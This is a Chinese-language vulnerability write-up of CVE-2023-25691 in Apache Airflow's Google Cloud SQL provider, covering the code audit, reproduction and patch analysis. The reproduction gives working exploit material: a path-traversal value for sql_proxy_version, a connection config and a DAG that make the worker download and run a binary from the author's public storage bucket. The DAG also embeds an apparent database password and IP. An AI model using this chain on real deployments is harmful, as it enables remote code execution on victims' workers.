# CVE-2023-25691 Apache Airflow Google Cloud Sql Provider 远程命令执行

Apache Airflow Google Cloud Provider 在所有版本（验证版本为8.8.0）中由于 cloud_sql.py
类中没有对参数进行有效过滤，攻击者可在与 CloudSQLDatabaseHook建立连接时传入恶意的 sql_proxy_version
参数，从而使得向外下载恶意文件并执行，最终导致执行恶意代码。

## 0x01 代码审计

airflow中对谷歌云支持的相关功能都在apache-airflow-providers-google中，其中在airflow\providers\google\cloud\hooks\cloud_sql.py中操作google cloud
sql实例时，代码逻辑里面会从指定url下载google cloud proxy二进制文件，并直接运行该二进制文件，之后才能操作google cloud
sql实例。以下是代理程序下载的逻辑。

![](./img/4490796056174965905.png)

![](./img/5255176637889541765.png)  
其中下载的url在指定了sql_proxy_version参数时，会将用户在连接参数里面设置的sql_proxy_version拼接到`CLOUD_SQL_PROXY_VERSION_DOWNLOAD_URL`里面，而后续只是用状态码200作为判断代理文件是否下载成功，这意味着我似乎可以在`sql_proxy_version`加入`../`来穿越到其他目录和路径，去下载其他二进制文件，达到远程命令执行。经过搜索相关资料，发现
**storage.googleapis.com** 这个域名是谷歌云存储的公共访问域名，这意味着我也可以在上面存我自己的东西。

## 0x02复现步骤

**基础环境**  
airflow 2.5.1  
[apache-airflow-providers-google](https://airflow.apache.org/docs/apache-airflow-providers-google/8.8.0/) 8.8.0  
使用docker compose进行搭建

### 2.1 准备恶意可执行文件

编写如下exec.cpp文件

    
    
    #include<stdlib.h>
    using namespace std;
    int main(){
            system("mkdir /tmp/hello");
            return 0;
    }
    

在一个linux环境下，使用g++进行编译，并重命名为system

    
    
    g++ exec.cpp -o system
    

![](./img/1380977234816148725.png)  
将编译好的system恶意可执行文件放置到google cloud
storage,并设置权限为公开，本次利用我的地址为<https://storage.googleapis.com/swordlight/system>

### 2.2 创建恶意Google Cloud SQL Database连接

在Admin->Connections下创建如下名为aaa的Google Cloud SQL Database连接  
其中Host、Schema、Login、Port为必填，填上符合格式的内容即可

![](./img/5231005930137204946.png)  
其中Extra填写实际的内容如下，其中注意的是sql_proxy_version设置为`../swordlight/system?a=`

    
    
    {
      "project_id":"pivotal-gearing-375804",
      "instance":"hellopg",
      "location":"us-central1-b",
      "database_type":"postgres",
      "use_proxy":"True",
      "use_ssl":"False",
      "sql_proxy_use_tcp":"True",
      "sql_proxy_version":"../swordlight/system?a=",
      "sslcert":"",
      "sslkey":"",
      "sslrootcert":""
    }
    

### 2.3 在Dag中使用CloudSQLExecuteQueryOperator运算符进行验证

创建一个使用到CloudSQLExecuteQueryOperator运算符的google_test.py脚本，后台放置到/opt/airflow/dags目录，使得其能被airflow自动加载，内容如下，其中gcp_cloudsql_conn_id设置为我们上述建立的连接名称aaa

    
    
    from __future__ import annotations
    
    import os
    import subprocess
    from datetime import datetime
    from os.path import expanduser
    from urllib.parse import quote_plus
    
    from airflow import models
    from airflow.providers.google.cloud.operators.cloud_sql import CloudSQLExecuteQueryOperator
    
    
    SQL = [
        "CREATE TABLE IF NOT EXISTS TABLE_TEST (I INTEGER)",
        "CREATE TABLE IF NOT EXISTS TABLE_TEST (I INTEGER)",  # shows warnings logged
        "INSERT INTO TABLE_TEST VALUES (0)",
        "CREATE TABLE IF NOT EXISTS TABLE_TEST2 (I INTEGER)",
        "DROP TABLE TABLE_TEST",
        "DROP TABLE TABLE_TEST2",
    ]
    
    
    postgres_kwargs = dict(
        user="postgres",
        password=r"ktd2(%EzQ5",
        public_port="5432",
        public_ip="34.122.52.6",
        project_id="pivotal-gearing-375804",
        location="us-central1-b",
        instance="hellopg",
        database="postgres",
        client_cert_file="key/postgres-client-cert.pem",
        client_key_file=".key/postgres-client-key.pem",
        server_ca_file=".key/postgres-server-ca.pem",
    )
    
    
    # Postgres: connect via proxy over TCP
    os.environ["AIRFLOW_CONN_PROXY_POSTGRES_TCP"] = (
        "gcpcloudsql://{user}:{password}@{public_ip}:{public_port}/{database}?"
        "database_type=postgres&"
        "project_id={project_id}&"
        "location={location}&"
        "instance={instance}&"
        "use_proxy=True&"
        "sql_proxy_use_tcp=True".format(**postgres_kwargs)
    )
    
    connection_names = [
        "proxy_postgres_tcp",
    ]
    
    with models.DAG(
        dag_id="example_gcp_sql_query",
        start_date=datetime(2021, 1, 1),
        catchup=False,
        tags=["example"],
    ) as dag:
        prev_task = None
    
    
        task = CloudSQLExecuteQueryOperator(
            gcp_cloudsql_conn_id="aaa",gcp_conn_id="proxy_postgres_tcp",task_id="example_gcp_sql_task_proxy_postgres_tcp" , sql=SQL
        )
        if prev_task:
            prev_task >> task
        prev_task = task
    
    # [END howto_operator_cloudsql_query_operators]
    

![](./img/1050431520973698992.png)  
在UI管理界面开启我们的google_test.py脚本对应的example_gcp_sql_query dag,并运行

![](./img/1243485650048532146.png)  
点击进去,通过Graph 菜单查看运行图，以及日志

![](./img/6666745370108888184.png)  
从日志中可以看出受害机器向我们的谷歌云存储地址<https://storage.googleapis.com/swordlight/system>
下载了system文件，并重命名为/tmp/39cl4def_cloud_sql_proxy，然后并运行  
同时进入worker的后台也可以看到hello文件夹被创建成功

![](./img/7813672773256405330.png)

## 0x03危害

在airflow没有开启认证情况下，攻击者可以修改已有的连接配置信息，使得系统中使用到CloudSQLExecuteQueryOperator的dags在运行时会执行恶意命令。使用docker安装默认是带有apache-airflow-providers-google的，不过默认情况下并没有使用CloudSQLExecuteQueryOperator运算符的DAG,所以还是有点鸡肋的。

## 0x04 官方补丁分析

官方后续对传进去的`sql_proxy_version`使用正则表达式进行了严格的校验  
![](./img/8059691103995767487.png)

![](./img/5032142464617947261.png)  
之后无法在sql_proxy_version中加入其他字符进行目录穿越了。

